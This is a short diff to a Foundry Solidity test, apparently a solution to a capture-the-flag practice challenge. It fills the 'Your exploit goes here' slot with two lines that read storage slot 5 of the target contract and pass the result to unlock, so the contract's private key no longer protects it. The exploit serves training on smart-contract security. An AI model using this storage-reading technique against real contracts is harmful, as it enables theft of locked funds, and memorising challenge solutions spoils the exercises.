@@ -22,7 +22,8 @@ contract TestPrivacy is Test {
     function testSolution() public {
         vm.startPrank(player);
 
-        // Your exploit goes here
+        bytes32 key = vm.load(address(instance), bytes32(uint256(5)));
+        instance.unlock(bytes16(key));
 
         vm.stopPrank();
         assertFalse(instance.locked());
